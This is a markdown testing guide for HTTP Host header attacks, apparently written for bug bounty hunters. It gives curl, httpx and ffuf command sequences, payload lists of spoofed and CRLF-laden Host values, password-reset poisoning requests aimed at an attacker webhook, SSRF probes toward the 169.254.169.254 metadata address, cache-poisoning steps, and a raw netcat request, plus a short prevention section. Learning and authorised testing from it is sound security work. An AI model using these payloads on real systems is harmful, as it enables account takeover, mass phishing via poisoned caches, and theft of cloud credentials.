# HTTP Host Header Attacks

> Comprehensive HTTP Host header injection testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

HTTP Host Header Attacks exploit applications that trust user‑supplied `Host` header (or related headers like `X‑Forwarded‑Host`) without validation, leading to password reset poisoning, open redirects, web cache poisoning, SSRF, virtual host confusion, and bypass of restrictions. Based on PortSwigger Host Header labs, OWASP WSTG Host Header Injection testing, PayloadsAllTheThings, and 2025–2026 trends (X‑Forwarded‑Host bypasses, Node.js/Koa parser quirks, Undertow/JBoss flaws, poisoned reset ATO chains, virtual host confusion, cache/SSRF combos per recent CVEs).

## Methodology

### 1. Target & Endpoint Identification
- **High‑value endpoints:** Password reset / forgot‑password flows, email verification / magic links, OAuth/SSO consent redirects, absolute URL generation (emails, PDFs, API responses), webhook / callback URLs, internal redirects / proxy forwards, admin panels / login redirects, any feature building `https://{host}/path?token=...`
- **Common vulnerable patterns:**
  - Application uses `request.host`, `req.headers.host`, or `X‑Forwarded‑Host` for base URL
  - No validation / allow‑list for Host value
  - Behind proxy/load balancer that passes Host unchecked
  - Reflection of Host header in response body, headers, or redirect `Location`

### 2. Basic Probes & Detection
- **Host header injection:** Send `Host: evil.com`; check if reflected in generated links, redirects, or response
- **X‑Forwarded‑Host bypass:** If Host sanitized, try `X‑Forwarded‑Host: evil.com`, `X‑Forwarded‑Server`, `X‑Host`
- **Malformed Host values:** `evil.com@target.com`, `evil.com:12345`, `evil.com\r\n` (CRLF), `[::1]` (IPv6 localhost), duplicate headers
- **Password reset poisoning:** Inject Host in reset request; see if reset email link points to evil.com

### 3. Advanced Bypass Techniques (2025–2026)
- **Proxy / forwarded header bypass:** `X‑Forwarded‑Host`, `X‑Forwarded‑Server`, `X‑Host`, `X‑Forwarded‑Proto` (downgrade)
- **Parser quirks:** Node.js/Koa naive parsing of `@`, Undertow/JBoss core flaws, Astro SSR error page SSRF via Host
- **Duplicate headers:** Send two `Host` headers; some proxies take last
- **Absolute URL confusion:** Combine with path like `/evil.com/reset`
- **Virtual host confusion:** Spoof internal hosts (`localhost`, `internal.target.com`) to access restricted features
- **Cache poisoning:** If Host reflected in cacheable response, poison cache for all users

### 4. Chained Exploitation
- **Password reset poisoning → ATO:** Hijack reset token via poisoned link
- **Open redirect / phishing:** Poisoned redirect URLs lead to malicious sites
- **Web cache poisoning:** Host reflected in cached content → mass phishing
- **SSRF:** Host used in internal fetches (e.g., metadata endpoints) → cloud credential theft
- **Virtual host bypass:** Access admin panel by spoofing internal host header
- **Host + dangling markup → XSS:** Poisoned emails with dangling markup leading to XSS

## Tool Installation

```bash
# Core reconnaissance & fuzzing tools
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Host‑header‑specific tools
git clone https://github.com/intruder‑io/host‑header‑injection‑scanner.git  # Burp extension (manual)
# Use Burp Suite with Param Miner extension for header discovery

# Parameter discovery & manipulation
go install github.com/tomnomnom/gf@latest
go install github.com/tomnomnom/qsreplace@latest

# Out‑of‑band detection
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

## Testing Commands

### 1. Basic Host Header Injection Detection

```bash
# Test with X‑Forwarded‑Host
cat crawledurls.txt | httpx -silent -H "X-Forwarded-Host: evil.com" -match-string "evil.com" | anew host-header-basic-hits.txt

# Test with Host header (requires curl/httpx with raw headers)
cat crawledurls.txt | while read url; do
  curl -s -H "Host: evil.com" "$url" | grep -q "evil.com" && echo "$url"
done | tee host-header-hosts.txt

# Test multiple headers
cat crawledurls.txt | httpx -silent -H "Host: evil.com" -H "X-Forwarded-Host: evil.com" -match-string "evil.com" | anew host-header-duplicate-hits.txt
```

### 2. Manual Testing with Curl

```bash
# Test Host header reflection
curl -H "Host: evil.com" "http://target.com/page" -I | grep -i "evil.com"

# Test X‑Forwarded‑Host
curl -H "X-Forwarded-Host: evil.com" "http://target.com/page" -I | grep -i "evil.com"

# Test combination
curl -H "Host: target.com" -H "X-Forwarded-Host: evil.com" "http://target.com/page" -I

# Test malformed Host
curl -H "Host: evil.com@target.com" "http://target.com/page" -I
curl -H "Host: evil.com:12345" "http://target.com/page" -I
curl -H "Host: evil.com\r\nX-Injected: header" "http://target.com/page" -I
```

### 3. Password Reset Poisoning

```bash
# Send reset request with poisoned Host
curl -X POST "http://target.com/password-reset" -H "Host: evil.com" -d "email=target@target.com"

# Check email link (requires email capture)
# Simulate with webhook endpoint
curl -X POST "http://target.com/password-reset" -H "Host: your‑webhook.site" -d "email=victim@example.com"
```

### 4. Advanced Header Fuzzing

```bash
# Create header payloads
cat > host-payloads.txt << EOF
evil.com
evil.com:80
evil.com:443
evil.com@target.com
evil.com%0d%0aX-Injected: header
[::1]
127.0.0.1
localhost
target.com.evil.com
evil.target.com
EOF

# Fuzz with ffuf
ffuf -u https://target.com/forgot-password -H "Host: FUZZ" -w /home/pwn/wordlists/host-payloads.txt -fr "evil.com" -o ffuf-host.txt

# Fuzz X‑Forwarded‑Host variants
cat > forwarded-headers.txt << EOF
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Host: evil.com
X-Forwarded-For: evil.com
X-Original-Host: evil.com
Forwarded: for=evil.com;host=evil.com
EOF

while read header; do
  curl -s -H "$header" "http://target.com/page" | grep -q "evil.com" && echo "Vulnerable: $header"
done < forwarded-headers.txt
```

### 5. Cache Poisoning Detection

```bash
# Check if Host reflected in cacheable response
curl -H "Host: evil.com" "http://target.com/static/page" -I | grep -i "cache-control"

# Poison cache and verify
curl -H "Host: evil.com" "http://target.com/page" -I
curl "http://target.com/page" -I | grep -i "evil.com"  # If cached, may still reflect evil.com
```

### 6. SSRF via Host Header

```bash
# Test if Host used in internal requests (e.g., metadata)
curl -H "Host: 169.254.169.254" "http://target.com/api/fetch" -I

# Use interactsh for OOB detection
INTERACTSH="https://YOUR_ID.oast.pro"
curl -H "Host: $INTERACTSH" "http://target.com/api/fetch" -I
```

### 7. Virtual Host Confusion

```bash
# Spoof internal hostnames
for host in localhost 127.0.0.1 internal admin internal.target.com; do
  curl -H "Host: $host" "http://target.com/admin" -I | grep -E "200|301|302" && echo "Possible access: $host"
done
```

### 8. Duplicate Header Testing

```bash
# Send duplicate Host headers (some parsers take first, some last)
curl -H "Host: target.com" -H "Host: evil.com" "http://target.com/page" -I

# Using printf to embed newline
printf "GET /page HTTP/1.1\r\nHost: target.com\r\nHost: evil.com\r\n\r\n" | nc target.com 80
```

### 9. Nuclei Templates for Host Header Attacks

```bash
# Scan with nuclei host‑header templates
nuclei -u https://target.com -t ~/nuclei-templates/host-header/ -o nuclei-host-header.txt

# Use specific tags
nuclei -u https://target.com -tags host-header -o nuclei-host-header-tagged.txt
```

### 10. Automated Scanning with Burp & Param Miner

```bash
# Use Burp Suite manually for best results
# Param Miner extension can guess headers
# Host Header Inchecktion extension for active scanning
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

- **Node.js/Koa parser quirks:** `Host: evil.com@target.com` interpreted as username
- **Undertow/JBoss flaws:** CVE‑2025‑12543, Host header parsing vulnerabilities
- **Astro SSR error page SSRF:** Host header used in internal fetch
- **Duplicate header exploitation:** Some proxies take last Host header
- **IPv6 localhost:** `[::1]` bypasses IPv4 filters
- **CRLF injection via Host:** `evil.com\r\nX‑Injected: header` splits headers
- **Cache poisoning with unkeyed headers:** Combine Host with `X‑Forwarded‑Host` for cache poisoning
- **Password reset poisoning with token reuse:** Poisoned link token reused across users

## Detection & Verification

- **Generated link/email uses injected Host** – e.g., reset email contains `https://evil.com/reset?token=...`
- **Redirect Location header poisoned** – `Location: https://evil.com/...`
- **Cache HIT serves poisoned response** – without injected header, still reflects evil.com
- **SSRF callback** – OAST (Interactsh/Burp Collaborator) receives request from server
- **Virtual host bypass** – Access restricted endpoint via spoofed internal Host
- **Blind indicators** – Time differences, side‑effects (e.g., reset email sent with evil domain)
- **PoC:** Screenshot of poisoned reset email, network capture of SSRF callback, demonstration of cache poisoning impact

## Prevention (Developer View – OWASP Latest)

1. **Validate Host strictly** – Allow‑list known domains only (no wildcards/subdomains unless intended)
2. **Use server config** – Derive base URL from trusted source (e.g., `SERVER_NAME`, environment variable)
3. **Ignore / strip dangerous forwarded headers** in application logic
4. **Absolute URLs** – Hardcode or use trusted configuration
5. **Proxy hardening** – Set `trusted_proxies`, validate Host upstream
6. **Avoid Host in security flows** – Use session‑based tokens, not URL domains
7. **WAF / rules** – Block malformed Host, duplicate headers, suspicious values
8. **Regular security testing** – Include Host header injection checks in CI/CD pipelines

## References

- **Checklist**: [Web‑Vulnerability‑Testing‑Checklist/HTTP‑Host‑Header‑Attacks.md](../Web‑Vulnerability‑Testing‑Checklist/HTTP‑Host‑Header‑Attacks.md)
- **PortSwigger HTTP Host Header Attacks**: https://portswigger.net/web‑security/host‑header
- **PortSwigger Password Reset Poisoning**: https://portswigger.net/web‑security/host‑header/exploiting/password‑reset‑poisoning
- **OWASP Testing for Host Header Injection**: https://owasp.org/www‑project‑web‑security‑testing‑guide/latest/4‑Web_Application_Security_Testing/07‑Input_Validation_Testing/17‑Testing_for_Host_Header_Injection
- **PayloadsAllTheThings – Host Header**: https://github.com/swisskyrepo/PayloadsAllTheThings (search Host section)
- **Recent 2025–2026 CVEs**: Koa CVE‑2026‑27959, Undertow CVE‑2025‑12543, Astro SSRF chains, bounty write‑ups on reset hijacking (Medium/Intigriti)

> **Happy (ethical) hunting** — Host Header Attacks (especially password reset poisoning) still enable high‑impact ATO in 2026 apps with weak proxy/app configs!